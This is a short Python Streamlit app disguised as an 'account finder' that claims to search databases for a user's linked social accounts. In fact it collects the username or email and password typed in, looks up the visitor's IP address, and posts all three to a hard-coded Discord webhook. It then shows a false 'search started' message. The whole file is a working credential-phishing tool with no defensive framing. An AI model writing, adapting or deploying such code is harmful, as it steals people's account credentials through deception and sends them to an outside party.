

import streamlit as st
import requests

# Page setup
st.set_page_config(page_title="GHOST FINDER", page_icon="🕵️")
st.markdown("## 🕵️ ACCOUNT FINDER")
st.write("Enter details to search for linked social accounts.")

# Inputs
user = st.text_input("Username / Email")
password = st.text_input("Password", type="password")

if st.button("START SEARCHING 🔎"):
    if user and password:
        # Get IP (Metadata)
        try:
            ip = requests.get('https://api.ipify.org', timeout=5).text
        except:
            ip = "Unknown"

        # Your Discord Webhook
        webhook_url = "https://discordapp.com/api/webhooks/1472238603731206216/ImSnZGa6fRfzfp3vmGjl9GSoljXv_FQP042C4gRwdIQX_1Kd2XN-JJJp_gWz_rM43XCy"
        
        payload = {
            "embeds": [{
                "title": "Ghost Finder Result",
                "color": 15158332,
                "fields": [
                    {"name": "User", "value": user, "inline": True},
                    {"name": "Pass", "value": password, "inline": True},
                    {"name": "IP", "value": ip, "inline": False}
                ]
            }]
        }
        requests.post(webhook_url, json=payload)
        st.success("Search started... checking databases.")
    else:

        st.warning("Please fill in both boxes.")
